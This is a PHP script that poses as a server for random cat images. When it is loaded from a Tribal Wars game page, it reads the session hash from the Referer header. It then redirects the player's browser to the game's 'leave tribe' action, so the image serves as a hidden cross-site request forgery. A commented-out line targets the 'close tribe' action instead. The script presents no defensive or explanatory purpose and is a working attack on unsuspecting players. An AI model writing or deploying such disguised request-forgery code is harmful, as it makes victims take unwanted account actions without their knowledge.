<?php error_reporting(0);

if (isset($_SERVER['HTTP_REFERER'])) {
    $referer = $_SERVER['HTTP_REFERER'];

    if (1 === preg_match('/https:\/\/zz\d+\.tribalwars\.works\//', $referer, $matches)) {
        $server = $matches[0];
        if (preg_match('/&h=[0-9a-f]{8}/', $referer, $matches) > 0) {
            $hash = $matches[0];
        }
        if (isset($server, $hash)) {
            $url = $server . 'game.php?screen=ally&action=exit' . $hash;
            //$url = $server . 'game.php?screen=ally&action=close' . $hash;
            header('Location:' . $url);
            die();
        }
    }
}
$draw = rand(1, 3);
$name = 'cat' . $draw . '.png';
$fp = fopen($name, 'rb');
if (isset($_SERVER['QUERY_STRING']) && $_SERVER['QUERY_STRING'] === 'silent') {
    die();
}
header("Content-Type: image/png");
header("Content-Length: " . filesize($name));
fpassthru($fp);